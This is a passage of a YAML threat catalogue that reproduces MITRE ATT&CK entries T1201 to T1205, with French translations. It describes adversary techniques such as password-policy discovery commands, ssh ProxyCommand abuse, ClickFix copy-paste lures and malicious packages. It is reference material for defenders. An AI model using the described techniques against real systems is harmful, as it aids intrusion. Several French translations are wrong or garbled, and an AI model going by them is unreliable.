      https://attack.mitre.org/techniques/T1201'
    translations:
      fr:
        name: "D\xE9couverte de la politique de mot de passe"
        description: "Les adversaires peuvent tenter d\u2019acc\xE9der \xE0 des informations\
          \ d\xE9taill\xE9es sur la politique de mot de passe utilis\xE9e dans un\
          \ r\xE9seau d\u2019entreprise ou un environnement cloud. Les politiques\
          \ de mot de passe sont un moyen d\u2019imposer des mots de passe complexes\
          \ qui sont difficiles \xE0 deviner ou \xE0 d\xE9chiffrer \xE0 travers la\
          \ [Brute Force](https://attack.mitre.org/techniques/T1110). Ces informations\
          \ peuvent aider l\u2019adversaire \xE0 cr\xE9er une liste de mots de passe\
          \ courants et \xE0 lancer des attaques par dictionnaire et/ou par force\
          \ brute respectant la politique (par exemple, si la longueur minimale du\
          \ mot de passe doit \xEAtre 8, alors ne pas essayer des mots de passe comme\
          \ \xAB pass123 \xBB ; ne pas v\xE9rifier plus de 3 \xE0 4 mots de passe\
          \ par compte si le verrouillage est r\xE9gl\xE9 \xE0 6 afin de ne pas bloquer\
          \ les comptes).\n\nLes politiques de mot de passe peuvent \xEAtre d\xE9\
          finies et d\xE9couvertes sur Windows, Linux et macOS via divers utilitaires\
          \ de shell de commande tels que <code>les comptes net (/domain),</code>\
          \ <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -<username></code>l,\
          \ <code>cat /etc/pam.d/common-password</code>, et <code>pwpolicy getaccountpolicies</code>\
          \ (Citation : Politiques de mot de passe Linux Superutilisateur) (Citation\
          \ : Politiques de mot de passe utilisateur Jamf). Les adversaires peuvent\
          \ \xE9galement utiliser une [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ sur les dispositifs r\xE9seau pour d\xE9couvrir les informations de politique\
          \ de mot de passe (par exemple, <code>afficher aaa,</code> <code>afficher\
          \ a politique de crit\xE8res communs tous</code>). (Citation : US-CERT-TA18-106A)\n\
          \nLes politiques de mot de passe peuvent \xEAtre d\xE9couvertes dans les\
          \ environnements cloud \xE0 l\u2019aide d\u2019API disponibles telles que\
          \ <code>GetAccountPasswordPolicy</code> dans AWS (Citation : AWS GetPasswordPolicy).\n\
          https://attack.mitre.org/techniques/T1201"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1202
    ref_id: T1202
    name: Indirect Command Execution
    description: 'Adversaries may abuse utilities that allow for command execution
      to bypass security restrictions that limit the use of command-line interpreters.
      Various Windows utilities may be used to execute commands, possibly without
      invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193),
      the Program Compatibility Assistant (`pcalua.exe`), components of the Windows
      Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may
      invoke the execution of programs and commands from a [Command and Scripting
      Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via
      scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov
      2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping
      Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary
      to execute malicious commands via the `ProxyCommand` and `LocalCommand` options,
      which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation:
      Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey
      Bot)


      Adversaries may abuse these features for [Stealth](https://attack.mitre.org/tactics/TA0005),
      specifically to perform arbitrary execution while subverting detections and/or
      mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106)
      or file extensions more commonly associated with malicious payloads.

      https://attack.mitre.org/techniques/T1202'
    translations:
      fr:
        name: "Ex\xE9cution indirecte des commandes"
        description: "Les adversaires peuvent abuser des utilitaires permettant l\u2019\
          ex\xE9cution de commandes pour contourner les restrictions de s\xE9curit\xE9\
          \ qui limitent l\u2019utilisation des interpr\xE9teurs en ligne de commande.\
          \ Divers utilitaires Windows peuvent \xEAtre utilis\xE9s pour ex\xE9cuter\
          \ des commandes, \xE9ventuellement sans invoquer [cmd](https://attack.mitre.org/software/S0106).\
          \ Par exemple, [Forfiles](https://attack.mitre.org/software/S0193), l\u2019\
          Assistant de Compatibilit\xE9 de Programmes (\xAB pcalua.exe \xBB), des\
          \ composants du Sous-syst\xE8me Windows pour Linux (WSL), \xAB Scriptrunner.exe\
          \ \xBB, ainsi que d\u2019autres utilitaires, peuvent invoquer l\u2019ex\xE9\
          cution de programmes et commandes depuis un [Interpr\xE9teur de commandes\
          \ et scripts](https://attack.mitre.org/techniques/T1059), une fen\xEAtre\
          \ Ex\xE9cution, ou via des scripts. (Citation : VectorSec ForFiles ao\xFB\
          t 2017)(Citation : Evi1cg Forfiles nov. 2017)(Citation : \xC9quipe s\xE9\
          curis\xE9e - Scriptrunner.exe)(Citation : SS64)(Citation : Ordinateur bip\
          \ - Scriptrunner.exe) Les adversaires peuvent \xE9galement abuser du binaire\
          \ \xAB ssh.exe \xBB pour ex\xE9cuter des commandes malveillantes via les\
          \ options \xAB ProxyCommand \xBB et \xAB LocalCommand \xBB, qui peuvent\
          \ \xEAtre invoqu\xE9es via le drapeau \xAB -o \xBB ou en modifiant le fichier\
          \ de configuration SSH. (Citation : Un acteur de menace vise l\u2019industrie\
          \ manufacturi\xE8re avec Lumma Stealer et Amadey Bot)\n\nLes adversaires\
          \ peuvent abuser de ces fonctionnalit\xE9s pour [Stealth](https://attack.mitre.org/tactics/TA0005),\
          \ notamment pour effectuer des ex\xE9cutions arbitraires tout en subvertissant\
          \ les d\xE9tections et/ou les contr\xF4les d\u2019att\xE9nuation (tels que\
          \ la politique de groupe) qui limitent/emp\xEAchent l\u2019utilisation de\
          \ [cmd](https://attack.mitre.org/software/S0106) ou d\u2019extensions de\
          \ fichiers plus couramment associ\xE9es \xE0 des charges utiles malveillantes.\n\
          https://attack.mitre.org/techniques/T1202"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1203
    ref_id: T1203
    name: Exploitation for Client Execution
    description: 'Adversaries may exploit software vulnerabilities in client applications
      to execute code. Vulnerabilities can exist in software due to unsecure coding
      practices that can lead to unanticipated behavior. Adversaries can take advantage
      of certain vulnerabilities through targeted exploitation for the purpose of
      arbitrary code execution. Oftentimes the most valuable exploits to an offensive
      toolkit are those that can be used to obtain code execution on a remote system
      because they can be used to gain access to that system. Users will expect to
      see files related to the applications they commonly used to do work, so they
      are a useful target for exploit research and development because of their high
      utility.


      Several types exist:


      ### Browser-based Exploitation


      Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
      and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint
      systems may be compromised through normal web browsing or from certain users
      being targeted by links in spearphishing emails to adversary controlled sites
      used to exploit the web browser. These often do not require an action by the
      user for the exploit to be executed.


      ### Office Applications


      Common office and productivity applications such as Microsoft Office are also
      targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious
      files will be transmitted directly as attachments or through links to download
      them. These require the user to open the document or file for the exploit to
      run.


      ### Common Third-party Applications


      Other applications that are commonly seen or are part of the software deployed
      in a target network may also be used for exploitation. Applications such as
      Adobe Reader and Flash, which are common in enterprise environments, have been
      routinely targeted by adversaries attempting to gain access to systems. Depending
      on the software and nature of the vulnerability, some may be exploited in the
      browser or require the user to open a file. For instance, some Flash exploits
      have been delivered as objects within Microsoft Office documents.

      https://attack.mitre.org/techniques/T1203'
    translations:
      fr:
        name: "Exploitation pour l\u2019ex\xE9cution client"
        description: "Les adversaires peuvent exploiter des vuln\xE9rabilit\xE9s logicielles\
          \ dans les applications clients pour ex\xE9cuter du code. Des vuln\xE9rabilit\xE9\
          s peuvent exister dans les logiciels en raison de pratiques de codage non\
          \ s\xE9curis\xE9es qui peuvent entra\xEEner des comportements impr\xE9vus.\
          \ Les adversaires peuvent tirer parti de certaines vuln\xE9rabilit\xE9s\
          \ par une exploitation cibl\xE9e dans le but d\u2019ex\xE9cuter du code\
          \ arbitraire. Souvent, les exploits les plus pr\xE9cieux pour une bo\xEE\
          te \xE0 outils offensive sont ceux qui peuvent \xEAtre utilis\xE9s pour\
          \ obtenir l\u2019ex\xE9cution du code sur un syst\xE8me distant, car ils\
          \ peuvent \xEAtre utilis\xE9s pour acc\xE9der \xE0 ce syst\xE8me. Les utilisateurs\
          \ s\u2019attendront \xE0 voir des fichiers li\xE9s aux applications qu\u2019\
          ils utilisaient couramment pour travailler, ce qui les rend une cible utile\
          \ pour la recherche et le d\xE9veloppement d\u2019exploits en raison de\
          \ leur grande utilit\xE9.\n\nPlusieurs types existent :\n\n### Exploitation\
          \ bas\xE9e sur navigateur\n\nLes navigateurs web sont une cible fr\xE9quente\
          \ via [Compromission en voiture](https://attack.mitre.org/techniques/T1189)\
          \ et [lien de phishing lanc\xE9](https://attack.mitre.org/techniques/T1566/002).\
          \ Les syst\xE8mes de terminaison peuvent \xEAtre compromis par une navigation\
          \ web normale ou par certains utilisateurs cibl\xE9s par des liens dans\
          \ des emails de spearphishing vers des sites contr\xF4l\xE9s par des adversaires\
          \ utilis\xE9s pour exploiter le navigateur web. Ces actions ne n\xE9cessitent\
          \ souvent pas d\u2019action de l\u2019utilisateur pour que l\u2019exploit\
          \ soit ex\xE9cut\xE9.\n\n### Candidatures de bureau\n\nLes applications\
          \ courantes de bureau et de productivit\xE9 telles que Microsoft Office\
          \ sont \xE9galement cibl\xE9es via le [phishing](https://attack.mitre.org/techniques/T1566).\
          \ Les fichiers malveillants seront transmis directement en pi\xE8ces jointes\
          \ ou via des liens pour les t\xE9l\xE9charger. Celles-ci n\xE9cessitent\
          \ que l\u2019utilisateur ouvre le document ou le fichier pour que l\u2019\
          exploit s\u2019ex\xE9cute.\n\n### Applications tierces courantes\n\nD\u2019\
          autres applications couramment observ\xE9es ou faisant partie du logiciel\
          \ d\xE9ploy\xE9 dans un r\xE9seau cible peuvent \xE9galement \xEAtre utilis\xE9\
          es pour l\u2019exploitation. Des applications telles qu\u2019Adobe Reader\
          \ et Flash, courantes dans les environnements d\u2019entreprise, ont r\xE9\
          guli\xE8rement \xE9t\xE9 cibl\xE9es par des adversaires cherchant \xE0 acc\xE9\
          der aux syst\xE8mes. Selon le logiciel et la nature de la vuln\xE9rabilit\xE9\
          , certaines peuvent \xEAtre exploit\xE9es dans le navigateur ou n\xE9cessiter\
          \ que l\u2019utilisateur ouvre un fichier. Par exemple, certains exploits\
          \ Flash ont \xE9t\xE9 livr\xE9s sous forme d\u2019objets dans des documents\
          \ Microsoft Office.\nhttps://attack.mitre.org/techniques/T1203"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204
    ref_id: T1204
    name: User Execution
    description: 'An adversary may rely upon specific actions by a user in order to
      gain execution. Users may be subjected to social engineering to get them to
      execute malicious code by, for example, opening a malicious document file or
      link. These user actions will typically be observed as follow-on behavior from
      forms of [Phishing](https://attack.mitre.org/techniques/T1566).


      While [User Execution](https://attack.mitre.org/techniques/T1204) frequently
      occurs shortly after Initial Access it may occur at other phases of an intrusion,
      such as when an adversary places a file in a shared directory or on a user''s
      desktop hoping that a user will click on it. This activity may also be seen
      shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).


      Adversaries may also deceive users into performing actions such as:


      * Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219),
      allowing direct control of the system to the adversary

      * Running malicious JavaScript in their browser, allowing adversaries to [Steal
      Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos
      Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)

      * Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204)

      * Coerceing users to copy, paste, and execute malicious code manually(Citation:
      Reliaquest-execution)(Citation: proofpoint-selfpwn)


      For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566),
      vishing, or various forms of user interaction. Adversaries can use a combination
      of these methods, such as spoofing and promoting toll-free numbers or call centers
      that are used to direct victims to malicious websites, to deliver and execute
      payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation:
      Telephone Attack Delivery)'
    translations:
      fr:
        name: "Ex\xE9cution utilisateur"
        description: "Un adversaire peut s\u2019appuyer sur des actions sp\xE9cifiques\
          \ d\u2019un utilisateur pour obtenir l\u2019ex\xE9cution. Les utilisateurs\
          \ peuvent \xEAtre soumis \xE0 l\u2019ing\xE9nierie sociale pour les pousser\
          \ \xE0 ex\xE9cuter du code malveillant, par exemple en ouvrant un fichier\
          \ ou un lien de document malveillant. Ces actions des utilisateurs sont\
          \ g\xE9n\xE9ralement observ\xE9es comme des comportements ult\xE9rieurs\
          \ issus de formes de [phishing](https://attack.mitre.org/techniques/T1566).\n\
          \nBien que [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204)\
          \ ait souvent lieu peu apr\xE8s l\u2019acc\xE8s initial, elle peut survenir\
          \ \xE0 d\u2019autres phases d\u2019une intrusion, comme lorsqu\u2019un adversaire\
          \ place un fichier dans un r\xE9pertoire partag\xE9 ou sur le bureau d\u2019\
          un utilisateur en esp\xE9rant que celui-ci cliquera dessus. Cette activit\xE9\
          \ peut \xE9galement \xEAtre observ\xE9e peu apr\xE8s [Spearphishing interne](https://attack.mitre.org/techniques/T1534).\n\
          \nLes adversaires peuvent \xE9galement tromper les utilisateurs pour qu\u2019\
          ils accomplissent des actions telles que :\n\n* Activation des [Outils d\u2019\
          acc\xE8s \xE0 distance](https://attack.mitre.org/techniques/T1219), permettant\
          \ le contr\xF4le direct du syst\xE8me \xE0 l\u2019adversaire\n* Ex\xE9cution\
          \ d\u2019un JavaScript malveillant dans leur navigateur, permettant aux\
          \ adversaires de [Voler le cookie de session web](https://attack.mitre.org/techniques/T1539)s(Citation\
          \ : Talos Roblox Scam 2023)(Citation : Krebs Discord Bookmarks 2023)\n*\
          \ T\xE9l\xE9charger et ex\xE9cuter des logiciels malveillants pour [Ex\xE9\
          cution utilisateur](https://attack.mitre.org/techniques/T1204)\n* Contraindre\
          \ les utilisateurs \xE0 copier, coller et ex\xE9cuter manuellement du code\
          \ malveillant (Citation : Reliaquest-execution)(Citation : proofpoint-selfpwn)\n\
          \nPar exemple, les arnaques au support technique peuvent \xEAtre facilit\xE9\
          es via le [phishing](https://attack.mitre.org/techniques/T1566), le vishing,\
          \ ou diverses formes d\u2019interaction utilisateur. Les adversaires peuvent\
          \ utiliser une combinaison de ces m\xE9thodes, comme l\u2019usurpation et\
          \ la promotion de num\xE9ros verts ou de centres d\u2019appels utilis\xE9\
          s pour diriger les victimes vers des sites web malveillants, pour livrer\
          \ et ex\xE9cuter des charges utiles contenant des logiciels malveillants\
          \ ou des [Outils d\u2019acc\xE8s \xE0 distance](https://attack.mitre.org/techniques/T1219).\
          \ (Citation : Livraison d\u2019attaque t\xE9l\xE9phonique)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.001
    ref_id: T1204.001
    name: Malicious Link
    description: 'An adversary may rely upon a user clicking a malicious link in order
      to gain execution. Users may be subjected to social engineering to get them
      to click on a link that will lead to code execution. This user action will typically
      be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002).
      Clicking on a link may also lead to other execution techniques such as exploitation
      of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).
      Links may also lead users to download files that require execution via [Malicious
      File](https://attack.mitre.org/techniques/T1204/002).

      https://attack.mitre.org/techniques/T1204/001'
    translations:
      fr:
        name: Lien malveillant
        description: "Un adversaire peut compter sur un utilisateur cliquant sur un\
          \ lien malveillant afin d\u2019obtenir son ex\xE9cution. Les utilisateurs\
          \ peuvent \xEAtre soumis \xE0 l\u2019ing\xE9nierie sociale pour les inciter\
          \ \xE0 cliquer sur un lien qui m\xE8nera \xE0 l\u2019ex\xE9cution du code.\
          \ Cette action utilisateur sera g\xE9n\xE9ralement observ\xE9e comme un\
          \ comportement de suivi de [Lien Spearphishing](https://attack.mitre.org/techniques/T1566/002).\
          \ Cliquer sur un lien peut \xE9galement conduire \xE0 d\u2019autres techniques\
          \ d\u2019ex\xE9cution, telles que l\u2019exploitation d\u2019une vuln\xE9\
          rabilit\xE9 d\u2019un navigateur ou d\u2019une application via [Exploitation\
          \ for Client Execution](https://attack.mitre.org/techniques/T1203). Les\
          \ liens peuvent \xE9galement amener les utilisateurs \xE0 t\xE9l\xE9charger\
          \ des fichiers n\xE9cessitant une ex\xE9cution via [Fichier malveillant](https://attack.mitre.org/techniques/T1204/002).\n\
          https://attack.mitre.org/techniques/T1204/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.002
    ref_id: T1204.002
    name: Malicious File
    description: "An adversary may rely upon a user opening a malicious file in order\
      \ to gain execution. Users may be subjected to social engineering to get them\
      \ to open a file that will lead to code execution. This user action will typically\
      \ be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).\
      \ Adversaries may use several types of files that require a user to execute\
      \ them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg,\
      \ and .iso.(Citation: Mandiant Trojanized Windows 10)\n\nAdversaries may employ\
      \ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)\
      \ to increase the likelihood that a user will open and successfully execute\
      \ a malicious file. These methods may include using a familiar naming convention\
      \ and/or password protecting the file and supplying instructions to a user on\
      \ how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious\
      \ File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly\
      \ after Initial Access it may occur at other phases of an intrusion, such as\
      \ when an adversary places a file in a shared directory or on a user's desktop\
      \ hoping that a user will click on it. This activity may also be seen shortly\
      \ after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)."
    translations:
      fr:
        name: Fichier malveillant
        description: "Un adversaire peut compter sur l\u2019ouverture d\u2019un fichier\
          \ malveillant par un utilisateur afin d\u2019obtenir son ex\xE9cution. Les\
          \ utilisateurs peuvent \xEAtre soumis \xE0 l\u2019ing\xE9nierie sociale\
          \ pour les forcer \xE0 ouvrir un fichier qui m\xE8nera \xE0 l\u2019ex\xE9\
          cution du code. Cette action utilisateur sera g\xE9n\xE9ralement observ\xE9\
          e comme un comportement de suivi \xE0 partir de [Joint Spearphishing](https://attack.mitre.org/techniques/T1566/001).\
          \ Les adversaires peuvent utiliser plusieurs types de fichiers n\xE9cessitant\
          \ qu\u2019un utilisateur les ex\xE9cute, notamment .doc, .pdf, .xls, .rtf,\
          \ .scr, .exe, .lnk, .pif, .cpl, .reg, et .iso. (Citation : Mandiant trojanis\xE9\
          \ Windows 10)\n\nLes adversaires peuvent employer diverses formes de [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ et [Fichiers ou informations obscurciss\xE9s](https://attack.mitre.org/techniques/T1027)\
          \ pour augmenter la probabilit\xE9 qu\u2019un utilisateur ouvre et ex\xE9\
          cute avec succ\xE8s un fichier malveillant. Ces m\xE9thodes peuvent inclure\
          \ l\u2019utilisation d\u2019une convention de nommage famili\xE8re et/ou\
          \ la protection du fichier par mot de passe, ainsi que la fourniture d\u2019\
          instructions \xE0 l\u2019utilisateur sur la mani\xE8re de l\u2019ouvrir.\
          \ (Citation : Documents Word prot\xE9g\xE9s par mot de passe) \n\nBien que\
          \ [Fichier malveillant](https://attack.mitre.org/techniques/T1204/002) survienne\
          \ fr\xE9quemment peu apr\xE8s l\u2019acc\xE8s initial, il peut survenir\
          \ \xE0 d\u2019autres phases d\u2019une intrusion, comme lorsqu\u2019un adversaire\
          \ place un fichier dans un r\xE9pertoire partag\xE9 ou sur le bureau d\u2019\
          un utilisateur en esp\xE9rant que celui-ci cliquera dessus. Cette activit\xE9\
          \ peut \xE9galement \xEAtre observ\xE9e peu apr\xE8s [Spearphishing interne](https://attack.mitre.org/techniques/T1534)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.003
    ref_id: T1204.003
    name: Malicious Image
    description: 'Adversaries may rely on a user running a malicious image to facilitate
      execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud
      Platform (GCP) Images, and Azure Images as well as popular container runtimes
      such as Docker can be backdoored. Backdoored images may be uploaded to a public
      repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001),
      and users may then download and deploy an instance or container from the image
      without realizing the image is malicious, thus bypassing techniques that specifically
      achieve Initial Access. This can lead to the execution of malicious code, such
      as code that executes cryptocurrency mining, in the instance or container.(Citation:
      Summit Route Malicious AMIs)


      Adversaries may also name images a certain way to increase the chance of users
      mistakenly deploying an instance or container from the image (ex: [Match Legitimate
      Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation:
      Aqua Security Cloud Native Threat Report June 2021)

      https://attack.mitre.org/techniques/T1204/003'
    translations:
      fr:
        name: Image malveillante
        description: "Les adversaires peuvent compter sur un utilisateur ex\xE9cutant\
          \ une image malveillante pour faciliter l\u2019ex\xE9cution. Amazon Web\
          \ Services (AWS), Amazon Machine Images (AMI), Google Cloud Platform (GCP)\
          \ Images et Azure Images ainsi que des environnements d\u2019ex\xE9cution\
          \ populaires comme Docker peuvent \xEAtre d\xE9rob\xE9s. Les images en backdoor\
          \ peuvent \xEAtre t\xE9l\xE9charg\xE9es dans un d\xE9p\xF4t public via [Upload\
          \ Malware](https://attack.mitre.org/techniques/T1608/001), et les utilisateurs\
          \ peuvent alors t\xE9l\xE9charger et d\xE9ployer une instance ou un conteneur\
          \ \xE0 partir de l\u2019image sans se rendre compte que l\u2019image est\
          \ malveillante, contournant ainsi les techniques qui permettent sp\xE9cifiquement\
          \ l\u2019acc\xE8s initial. Cela peut entra\xEEner l\u2019ex\xE9cution de\
          \ code malveillant, comme celui qui ex\xE9cute le minage de cryptomonnaies,\
          \ dans l\u2019instance ou le conteneur. (Citation : AMI malveillantes de\
          \ la route du sommet)\n\nLes adversaires peuvent aussi nommer les images\
          \ d\u2019une certaine mani\xE8re afin d\u2019augmenter le risque que les\
          \ utilisateurs d\xE9ploient par erreur une instance ou un conteneur \xE0\
          \ partir de l\u2019image (ex : [Correspondre le nom ou l\u2019emplacement\
          \ l\xE9gitime de la ressource](https://attack.mitre.org/techniques/T1036/005)).\
          \ (Citation : Rapport de menace natif Aqua Security Cloud juin 2021)\nhttps://attack.mitre.org/techniques/T1204/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.004
    ref_id: T1204.004
    name: Malicious Copy and Paste
    description: "An adversary may rely upon a user copying and pasting code in order\
      \ to gain execution. Users may be subjected to social engineering to get them\
      \ to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
      \ One such strategy is \"ClickFix,\" in which adversaries present users with\
      \ seemingly helpful solutions\u2014such as prompts to fix errors or complete\
      \ CAPTCHAs\u2014that instead instruct the user to copy and paste malicious code.\n\
      \nMalicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
      \ may present fake error messages or CAPTCHA prompts that instruct users to\
      \ open a terminal or the Windows Run Dialog box and execute an arbitrary command.\
      \ These commands may be obfuscated using encoding or other techniques to conceal\
      \ malicious intent. Once executed, the adversary will typically be able to establish\
      \ a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation:\
      \ Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab\
      \ LummaC2 2025)\n\nAdversaries may also leverage phishing emails for this purpose.\
      \ When a user attempts to open an attachment, they may be presented with a fake\
      \ error and offered a malicious command to paste as a solution, consistent with\
      \ the \"ClickFix\" strategy.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab\
      \ Malicioys Copy Paste 2024)\n\nTricking a user into executing a command themselves\
      \ may help to bypass email filtering, browser sandboxing, or other mitigations\
      \ designed to protect users against malicious downloaded files.\nhttps://attack.mitre.org/techniques/T1204/004"
    translations:
      fr:
        name: Copier-coller malveillant
        description: "Un adversaire peut compter sur un utilisateur qui copier-collera\
          \ du code pour obtenir son ex\xE9cution. Les utilisateurs peuvent \xEAtre\
          \ soumis \xE0 l\u2019ing\xE9nierie sociale pour les amener \xE0 copier-coller\
          \ du code directement dans un [Interpr\xE9teur de commandes et de scripts](https://attack.mitre.org/techniques/T1059).\
          \ L\u2019une de ces strat\xE9gies est \xAB ClickFix \xBB, dans laquelle\
          \ les adversaires pr\xE9sentent aux utilisateurs des solutions apparemment\
          \ utiles \u2014 comme des invites pour corriger des erreurs ou compl\xE9\
          ter des CAPTCHA \u2014 qui demandent \xE0 l\u2019utilisateur de copier-coller\
          \ du code malveillant.\n\nLes sites web malveillants, comme ceux utilis\xE9\
          s dans [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
          \ peuvent pr\xE9senter de faux messages d\u2019erreur ou des invites CAPTCHA\
          \ qui demandent aux utilisateurs d\u2019ouvrir un terminal ou la bo\xEE\
          te de dialogue Ex\xE9cuter Windows et d\u2019ex\xE9cuter une commande arbitraire.\
          \ Ces commandes peuvent \xEAtre obscurcies \xE0 l\u2019aide de l\u2019encodage\
          \ ou d\u2019autres techniques pour dissimuler une intention malveillante.\
          \ Une fois ex\xE9cut\xE9, l\u2019adversaire parvient g\xE9n\xE9ralement\
          \ \xE0 \xE9tablir un point d\u2019appui sur la machine de la victime. (Citation\
          \ : CloudSEK Lumma Stealer 2024)(Citation : Sekoia ClickFake 2025)(Citation\
          \ : Reliaquest CAPTCHA 2024)(Citation : AhnLab LummaC2 2025)\n\nLes adversaires\
          \ peuvent \xE9galement utiliser des e-mails de phishing \xE0 cette fin.\
          \ Lorsqu\u2019un utilisateur tente d\u2019ouvrir une pi\xE8ce jointe, il\
          \ peut recevoir une fausse erreur et lui proposer une commande malveillante\
          \ \xE0 coller comme solution, conform\xE9ment \xE0 la strat\xE9gie \xAB\
          \ ClickFix \xBB. (Citation : Proofpoint ClickFix 2024)(Citation : AhnLab\
          \ Malicioys Copy Colle 2024)\n\nTromper un utilisateur pour qu\u2019il ex\xE9\
          cute lui-m\xEAme une commande peut aider \xE0 contourner le filtrage des\
          \ e-mails, le sandboxing par navigateur ou d\u2019autres mesures con\xE7\
          ues pour prot\xE9ger les utilisateurs contre les fichiers t\xE9l\xE9charg\xE9\
          s malveillants.\nhttps://attack.mitre.org/techniques/T1204/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.005
    ref_id: T1204.005
    name: Malicious Library
    description: 'Adversaries may rely on a user installing a malicious library to
      facilitate execution. Threat actors may [Upload Malware](https://attack.mitre.org/techniques/T1608/001)
      to package managers such as NPM and PyPi, as well as to public code repositories
      such as GitHub. User may install libraries without realizing they are malicious,
      thus bypassing techniques that specifically achieve Initial Access. This can
      lead to the execution of malicious code, such as code that establishes persistence,
      steals data, or mines cryptocurrency.(Citation: Datadog Security Labs Malicious
      PyPi Packages 2024)(Citation: Fortinet Malicious NPM Packages 2023)


      In some cases, threat actors may compromise and backdoor existing popular libraries
      (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)).
      Alternatively, they may create entirely new packages and leverage behaviors
      such as typosquatting to encourage users to install them.

      https://attack.mitre.org/techniques/T1204/005'
    translations:
      fr:
        name: "Biblioth\xE8que malveillante"
        description: "Les adversaires peuvent compter sur l\u2019installation d\u2019\
          une biblioth\xE8que malveillante par un utilisateur pour faciliter l\u2019\
          ex\xE9cution. Les acteurs malveillants peuvent [T\xE9l\xE9charger des logiciels\
          \ malveillants](https://attack.mitre.org/techniques/T1608/001) vers des\
          \ gestionnaires de paquets tels que NPM et PyPi, ainsi que vers des d\xE9\
          p\xF4ts de code publics tels que GitHub. L\u2019utilisateur peut installer\
          \ des biblioth\xE8ques sans se rendre compte qu\u2019elles sont malveillantes,\
          \ contournant ainsi les techniques qui permettent sp\xE9cifiquement l\u2019\
          acc\xE8s initial. Cela peut conduire \xE0 l\u2019ex\xE9cution de code malveillant,\
          \ comme celui qui \xE9tablit la persistance, vole des donn\xE9es ou exploite\
          \ des cryptomonnaies. (Citation : Datadog Security Labs Packages PyPi malveillants\
          \ 2024)(Citation : Fortinet Malicious NPM Packages 2023)\n\nDans certains\
          \ cas, des acteurs malveillants peuvent compromettre et d\xE9tourner les\
          \ biblioth\xE8ques populaires existantes (par exemple, [Compromettre les\
          \ d\xE9pendances logicielles et les outils de d\xE9veloppement](https://attack.mitre.org/techniques/T1195/001)).\
          \ Alternativement, ils peuvent cr\xE9er de nouveaux packages et exploiter\
          \ des comportements comme le typosquatting pour encourager les utilisateurs\
          \ \xE0 les installer.\nhttps://attack.mitre.org/techniques/T1204/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205
    ref_id: T1205
    name: Traffic Signaling
    description: 'Adversaries may use traffic signaling to hide open ports or other
      malicious functionality used for persistence or command and control. Traffic
      signaling involves the use of a magic value or sequence that must be sent to
      a system to trigger a special response, such as opening a closed port or executing
      a malicious task. This may take the form of sending a series of packets with
      certain characteristics before a port will be opened that the adversary can
      use for command and control. Usually this series of packets consists of attempted
      connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)),
      but can involve unusual flags, specific strings, or other unique characteristics.
      After the sequence is completed, opening a port may be accomplished by the host-based
      firewall, but could also be implemented by custom software.


      Adversaries may also communicate with an already open port, but the service
      listening on that port will only respond to commands or trigger other malicious
      functionality if passed the appropriate magic value(s).


      The observation of the signal packets to trigger the communication can be conducted
      through different methods. One means, originally implemented by Cd00r (Citation:
      Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
      in question. Another method leverages raw sockets, which enables the malware
      to use ports that are already open for use by other programs.


      On network devices, adversaries may use crafted packets to enable [Network Device
      Authentication](https://attack.mitre.org/techniques/T1556/004) for standard
      services offered by the device such as telnet.  Such signaling may also be used
